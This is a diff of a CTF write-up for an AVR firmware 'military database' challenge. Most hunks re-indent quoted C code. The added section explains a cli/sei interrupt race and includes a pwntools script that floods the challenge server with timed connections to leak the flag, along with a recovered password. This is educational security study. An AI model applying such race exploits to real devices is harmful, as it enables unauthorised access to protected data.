@@ -84,15 +84,15 @@ is utilized by the AVR APIs, hence the re-declaration before the includes.
 const char* correctpass = PASS1;
 const char* top_secret_password = PASS2;
 const char* top_secret_data = 
-	"INTELLIGENCE REPORT:\n"
-	"FLAG CAPTURED FROM ENEMY.\n"
-	"FLAG IS " FLAG ".";
+    "INTELLIGENCE REPORT:\n"
+    "FLAG CAPTURED FROM ENEMY.\n"
+    "FLAG IS " FLAG ".";
 
 char buf[512];
 char secret[256] = 
-	"Operation SIERRA TANGO ROMEO:\n"
-	"Radio frequency: 13.37MHz\n"
-	"Received message: ATTACK AT DAWN\n";
+    "Operation SIERRA TANGO ROMEO:\n"
+    "Radio frequency: 13.37MHz\n"
+    "Received message: ATTACK AT DAWN\n";
 char timer_status[16] = "off";
 ```
 
@@ -113,7 +113,7 @@ Breakdown of what we have here:
 ```c
 volatile char uart_ready;
 ISR(USART_RX_vect) {
-	uart_ready = 1;
+    uart_ready = 1;
 }
 ```
 
@@ -140,29 +140,29 @@ although that's irrelevant for our case as we're not going to interface with phy
 
 ```c
 static int uart_getchar(FILE* stream) {
-	while (1) {
-		cli();
-		if (!uart_ready) {
-			sleep_enable();
-			sei();
-			sleep_cpu();
-			sleep_disable();
-		}
-		cli();
-		if (uart_ready) {
-			uart_ready = 0;
-			unsigned int c = UDR0;
-			sei();
-			return c;
-		}
-		sei();
-	}
+    while (1) {
+        cli();
+        if (!uart_ready) {
+            sleep_enable();
+            sei();
+            sleep_cpu();
+            sleep_disable();
+        }
+        cli();
+        if (uart_ready) {
+            uart_ready = 0;
+            unsigned int c = UDR0;
+            sei();
+            return c;
+        }
+        sei();
+    }
 }
 
 static int uart_putchar(char c, FILE* stream) {
-	loop_until_bit_is_set(UCSR0A, UDRE0);
-	UDR0 = c;
-	return 0;
+    loop_until_bit_is_set(UCSR0A, UDRE0);
+    UDR0 = c;
+    return 0;
 }
 static FILE uart = FDEV_SETUP_STREAM(uart_putchar, uart_getchar, _FDEV_SETUP_RW);
 ```
@@ -175,12 +175,12 @@ this is used to redirect all I/O to the UART driver interface that was just impl
 
 ```c
 void quit() {
-	printf("Quitting...\n");
-	_delay_ms(100);
-	cli();
-	sleep_enable();
-	sleep_cpu();
-	while (1);
+    printf("Quitting...\n");
+    _delay_ms(100);
+    cli();
+    sleep_enable();
+    sleep_cpu();
+    while (1);
 }
 ```
 
@@ -189,40 +189,40 @@ A `quit` function which halts the CPU and essentially causes a shutdown of the h
 ```c
 volatile uint32_t overflow_count;
 uint32_t get_time() {
-	uint32_t t;
-	cli();
-	t = (overflow_count << 16) + TCNT1;
-	sei();
-	return t;
+    uint32_t t;
+    cli();
+    t = (overflow_count << 16) + TCNT1;
+    sei();
+    return t;
 }
 
 void timer_on_off(char enable) {
-	overflow_count = 0;
-	strcpy(timer_status, enable ? "on" : "off");
-	if (enable) {
-		TCCR1B = (1<<CS10);
-		sei();
-	}
-	else {
-		TCCR1B = 0;
-	}
+    overflow_count = 0;
+    strcpy(timer_status, enable ? "on" : "off");
+    if (enable) {
+        TCCR1B = (1<<CS10);
+        sei();
+    }
+    else {
+        TCCR1B = 0;
+    }
 }
 
 ISR(TIMER1_OVF_vect) {
-	if (!logged_in) {
-		overflow_count++;
-		// Allow ten seconds.
-		if (overflow_count >= ((10*F_CPU)>>16)) {
-			printf("Timed out logging in.\n");
-			quit();
-		}
-	}
-	else {
-		// If logged in, timer is used to securely copy top secret data.
-		secret[top_secret_index] = top_secret_data[top_secret_index];
-		timer_on_off(top_secret_data[top_secret_index]);
-		top_secret_index++;
-	}
+    if (!logged_in) {
+        overflow_count++;
+        // Allow ten seconds.
+        if (overflow_count >= ((10*F_CPU)>>16)) {
+            printf("Timed out logging in.\n");
+            quit();
+        }
+    }
+    else {
+        // If logged in, timer is used to securely copy top secret data.
+        secret[top_secret_index] = top_secret_data[top_secret_index];
+        timer_on_off(top_secret_data[top_secret_index]);
+        top_secret_index++;
+    }
 }
 ```
 
@@ -256,11 +256,11 @@ We'll get back to this later.
 
 ```c
 void read_data(char* buf) {
-	scanf("%200s", buf);
+    scanf("%200s", buf);
 }
 
 void print_timer_status() {
-	printf("Timer: %s.\n", timer_status);
+    printf("Timer: %s.\n", timer_status);
 }
 ```
 
@@ -270,53 +270,53 @@ just prints out the contents of the `timer_status` variable, which is either `"o
 For the `main` function that is actually pretty big, we break it down into smaller chunks.
 
 ```c
-	uart_init();
-	stdout = &uart;
-	stdin = &uart;
+    uart_init();
+    stdout = &uart;
+    stdin = &uart;
 ```
 
 First, we initialize the UART bus on hardware and overwrite `stdout` and `stdin` to our previously crafted UART device so that all the I/O
 functions from `stdio.h` header will drive the UART.
 
 ```c
-	TCCR1A = 0;
-	TIMSK1 = (1<<TOIE1);
+    TCCR1A = 0;
+    TIMSK1 = (1<<TOIE1);
 ```
 
 As explained by the datasheet, these [MMIO](https://de.wikipedia.org/wiki/Memory_Mapped_I/O) writes are used to initialize the timer. Setting the `TOIE1` bit in the `TIMSK1` register will enable
 Counter 1 overflow interrupts that will be captured by the previously set up interrupt handler.
 
 ```c
-	printf("Initialized.\n");
-	printf("Welcome to secret military database. Press ENTER to continue.\n");
-	char enter = uart_getchar(0);
-	if (enter != '\n') {
-		quit();
-	}
+    printf("Initialized.\n");
+    printf("Welcome to secret military database. Press ENTER to continue.\n");
+    char enter = uart_getchar(0);
+    if (enter != '\n') {
+        quit();
+    }
 ```
 
 We're greeted and prompted to enter a `'\n'` character through ENTER, otherwise the program will quit.
 
 ```c
-	timer_on_off(1);
+    timer_on_off(1);
 ```
 
 The timer is being brought up!
 
 ```c
-	while (1) {
-		print_timer_status();
-		printf("Uptime: %ldus\n", get_time());
-		printf("Login: ");
-		read_data(buf);
-		printf("Password: ");
-		read_data(buf+256);
-		if (strcmp(buf, "agent") == 0 && strcmp(buf+256, correctpass) == 0) {
-			printf("Access granted.\n");
-			break;
-		}
-		printf("Wrong user/password.\n");
-	}
+    while (1) {
+        print_timer_status();
+        printf("Uptime: %ldus\n", get_time());
+        printf("Login: ");
+        read_data(buf);
+        printf("Password: ");
+        read_data(buf+256);
+        if (strcmp(buf, "agent") == 0 && strcmp(buf+256, correctpass) == 0) {
+            printf("Access granted.\n");
+            break;
+        }
+        printf("Wrong user/password.\n");
+    }
 ```
 
 The first rock in our way. We get the status of the timer and the uptime thrown into our way
@@ -334,11 +334,11 @@ infinite loop, whereas it just starts from the beginning of the block if we fail
 We'll get back to this later as well, I promise!
 
 ```c
-	cli();
-	timer_on_off(0);
-	sei();
+    cli();
+    timer_on_off(0);
+    sei();
 
-	logged_in = 1;
+    logged_in = 1;
 ```
 
 So now that we are logged in with correct credentials, the `logged_in` variable will be set accordingly and
@@ -353,58 +353,58 @@ With the `cli()` function or the `CLI` instruction in assembly, we can prevent i
 the `SEI` instruction turn on active interrupt delivery.
 
 ```c
-	while (1) {
-		print_timer_status();
-		printf("Menu:\n");
-		printf("1. Store secret data.\n");
-		printf("2. Read secret data.\n");
-		printf("3. Copy top secret data.\n");
-		printf("4. Exit.\n");
-		printf("Choice: ");
-		read_data(buf);
-		switch (buf[0]) {
-			case '1':
-			{
-				printf("Secret: ");
-				read_data(secret);
-				break;
-			}
-			case '2':
-			{
-				printf("Stored secret:\n---\n%s\n---\n", secret);
-				break;
-			}
-			case '3':
-			{
-				printf("Enter top secret data access code: ");
-				read_data(buf);
-				char pw_bad = 0;
-				for (int i = 0; top_secret_password[i]; i++) {
-					pw_bad |= top_secret_password[i]^buf[i];
-				}
-				if (pw_bad) {
-					printf("Access denied.\n");
-					break;
-				}
-				printf("Access granted.\nCopying top secret data...\n");
-				timer_on_off(1);
-				while (TCCR1B);
-				printf("Done.\n");
-				break;
-			}
-			case '4':
-			{
-				quit();
-				break;
-			}
-			default:
-			{
-				printf("Invalid option.\n");
-				break;
-			}
-		}
-	}
-	quit();
+    while (1) {
+        print_timer_status();
+        printf("Menu:\n");
+        printf("1. Store secret data.\n");
+        printf("2. Read secret data.\n");
+        printf("3. Copy top secret data.\n");
+        printf("4. Exit.\n");
+        printf("Choice: ");
+        read_data(buf);
+        switch (buf[0]) {
+            case '1':
+            {
+                printf("Secret: ");
+                read_data(secret);
+                break;
+            }
+            case '2':
+            {
+                printf("Stored secret:\n---\n%s\n---\n", secret);
+                break;
+            }
+            case '3':
+            {
+                printf("Enter top secret data access code: ");
+                read_data(buf);
+                char pw_bad = 0;
+                for (int i = 0; top_secret_password[i]; i++) {
+                    pw_bad |= top_secret_password[i]^buf[i];
+                }
+                if (pw_bad) {
+                    printf("Access denied.\n");
+                    break;
+                }
+                printf("Access granted.\nCopying top secret data...\n");
+                timer_on_off(1);
+                while (TCCR1B);
+                printf("Done.\n");
+                break;
+            }
+            case '4':
+            {
+                quit();
+                break;
+            }
+            default:
+            {
+                printf("Invalid option.\n");
+                break;
+            }
+        }
+    }
+    quit();
 ```
 
 The last block of the `main` function throws us into another infinite loop. This time, we're given the
@@ -461,15 +461,12 @@ int strcmp(const char *s1, const char *s2) {
 
     // Iterate over the characters in the string as long as they match.
     while ((c1 = *s1++) == (c2 = *s2++)) {
-
-        // If the null terminator is hit,
-        // the strings are equal and the function returns 0.
+        // If the null terminator is hit, the strings are equal and the function returns 0.
         if (c1 == '\0')
             return 0;
     }
 
-    // If the strings are not equal,
-    // return <0 or >0 based on the values of the inequal characters.
+    // If the strings are not equal, return <0 or >0 based on the values of the inequal characters.
     return (int)(c1 - c2);
 }
 ```
@@ -512,19 +509,167 @@ But here's the next issue. Normally, we would invoke command `3` and then `2` to
 yet another top secret password and...
 
 ```c
-				printf("Enter top secret data access code: ");
-				read_data(buf);
-				char pw_bad = 0;
-				for (int i = 0; top_secret_password[i]; i++) {
-					pw_bad |= top_secret_password[i]^buf[i];
-				}
-				if (pw_bad) {
-					printf("Access denied.\n");
-					break;
-				}
+                printf("Enter top secret data access code: ");
+                read_data(buf);
+                char pw_bad = 0;
+                for (int i = 0; top_secret_password[i]; i++) {
+                    pw_bad |= top_secret_password[i]^buf[i];
+                }
+                if (pw_bad) {
+                    printf("Access denied.\n");
+                    break;
+                }
 ```
 
 is a string comparison algorithm that isn't vulnerable to timing attacks, such as the first `strcmp`. Reading this piece
 of code up and down, there seems no attack surface that lets us recover the second password in order to get the flag.
 
 And this is where the real hardware-related challenge starts.
+
+## Catching up the Counter
+
+With seemingly no clue on how to obtain the flag from our standpoint, there are still a few things that seem curious to the reader.
+
+Although the code makes sure to turn off the timer before setting `logged_in` to `1` so that the timer would never copy data to the
+`secret` buffer without the password, why would you even rely on the timer in the first place for that? Why not put this piece of
+code behind the password check in the third CLI command?
+
+This led me to the conclusion that we must *somehow still* be able to activate the timer even without knowing the password for command
+`3`. And the lines of code that are being executed before officially setting us to logged in seemed like a good starting point to
+research with absolutely no other ideas.
+
+```c
+cli();
+timer_on_off(0);
+sei();
+
+logged_in = 1;
+```
+
+It took me a really long time to get behind the idea of this, but the trick lies in how the AVR interrupt controller works. So we know
+from previous investigation that `cli()` blocks all of our interrupt handlers from setting off, whereas `sei()` re-enables them. With a
+bit of further digging into how the mechanisms and these instructions work in reality, I discovered a really interesting take on the
+AVR manual in chapter 6.7 `Reset and Interrupt Handling`:
+
+![Reset and Interrupt Handling](./irq.png)
+
+Notice the last sentence in particular.
+
+> Similarly, if one or more interrupt conditions occur while the global interrupt enable bit is cleared, the corresponding interrupt flag(s) will be set and remembered until the global interrupt enable bit is set, and will then be executed by order of priority.
+
+So even if interrupt occur with the `I` bit being cleared in `SREG`, they will be remembered and dispatched as soon as the `I` bit is set
+again. Now this is interesting information to know in combination with what the manual states at the next page.
+
+![SEI behavior by design](./sei.png)
+
+We learn that SEI lets the following execution run first before re-enabling interrupt delivery. And this is the big price in this piece of code.
+
+The assembly-level state of things explains the scenario a bit better.
+
+```asm
+     390:	f8 94       	cli
+     392:	80 e0       	ldi	r24, 0x00	; 0
+     394:	0e 94 bf 00 	call	0x17e	;  0x17e
+     398:	78 94       	sei
+     39a:	81 e0       	ldi	r24, 0x01	; 1
+     39c:	80 93 8c 06 	sts	0x068C, r24	;  0x80068c
+```
+
+So first, interrupt delivery is being disabled through `cli`. All interrupts that happen after this (such as a timer overflow) would be stored for later.
+Then, the value of `0` is being loaded into `r24` as the argument to the `timer_on_off` function at address `0x17e`, which is being called after that.
+Then we have the `sei`, which re-enables the interrupt delivery - AFTER the next instruction - which loads `1` into `r24`. However, it will take the instruction
+after that too, which stores the contents of `r24` to location `0x80068C`, our `logged_in` variable, that is.
+
+To conclude, `sei` would have to execute the next **2** instructions to set `logged_in` to `1`. And if a counter overflow happened to be in the interrupt queue,
+it would execute the following code piece of code.
+
+```c
+        // If logged in, timer is used to securely copy top secret data.
+        secret[top_secret_index] = top_secret_data[top_secret_index];
+        timer_on_off(top_secret_data[top_secret_index]);
+        top_secret_index++;
+```
+
+But since we know that `top_secret_data` is just another string buffer, the `timer_on_off` function will leave the counter intact until the null byte is reached.
+That said, this portion would be executed all over and over again until our flag is fully copied into the `secret` buffer. From there, it's just an input of `2`
+away from being printed out for us.
+
+But still, 2 instructions instead of 1! But with all the speculation to it, it seemed like the most logical way to get the flag without the password and so I decided
+to stick to it without giving this a further thought. I honestly still don't know why sei executed, in fact, two instructions here, but if you know the answer, feel
+free to let me know! But anyway, let's write some more code hoping to be able to trigger the timer overflow in the timeframe between `cli()` and `timer_on_off(0)`.
+
+## Obtaining the Flag
+
+I wrote some code that makes use of multiprocessing to establish lots of connections to the server with some random delay appended to it, hoping to push the timer
+to some point really close to overflowing, but enough for the `strcmp` to complete and to reach the `cli();` call. You could've surely also implemented this in a smarter
+way considering you're given the timer value at the start of the program, during login, and also on every menu iteration. But this just worked out for me.
+
+```py
+from multiprocessing import Pool
+import random
+import re
+import time
+
+from pwn import *
+
+context.log_level = "error"
+
+USER = "agent"
+PASSWORD = "doNOTl4unch_missi1es!"
+
+SECRET = """Stored secret:
+---
+Operation SIERRA TANGO ROMEO:
+Radio frequency: 13.37MHz
+Received message: ATTACK AT DAWN
+
+---
+"""
+
+
+def get_flag(secret: str) -> str:
+    if match := re.search(r"CTF{.+}", secret, re.MULTILINE):
+        return match.group(0)
+
+    raise ValueError("The given secret string does not contain the flag.")
+
+
+def sei_race(_):
+    while True:
+        # Connect to the server and confirm the greeting.
+        connection = remote("avr.2020.ctfcompetition.com", 1337)
+        connection.sendafter(
+            "Welcome to secret military database. Press ENTER to continue.", "\n"
+        )
+
+        # Wait for a random delay, hoping to get the timer close to overflowing, and send our credentials.
+        time.sleep(random.random())
+
+        # Check if we triggered the race condition and the flag was copied.
+        connection.send(f"{USER}\n{PASSWORD}\n")
+        connection.sendafter("Choice: ", "2\n")
+        secret = connection.recvall().decode()
+        if not secret.startswith(SECRET):
+            print("Flag:", get_flag(secret))
+            return True
+
+        # Close the connection.
+        connection.close()
+
+        return False
+
+
+with Pool(None) as pool:
+    pool.map(sei_race, range(500))
+```
+
+It took quite some time, but it was worth it.
+
+```sh
+❯ python solve.py
+Flag: CTF{1nv1sibl3_sei_r4c3_c0ndi7i0n}
+```
+
+This challenge in particular made me, a baremetal developer with lots of project in the embedded domain, a lot more conscious
+about this kind of truly invisible hardware flaw and how fatal race conditions are even possible without any threading
+or multiprocessing code.
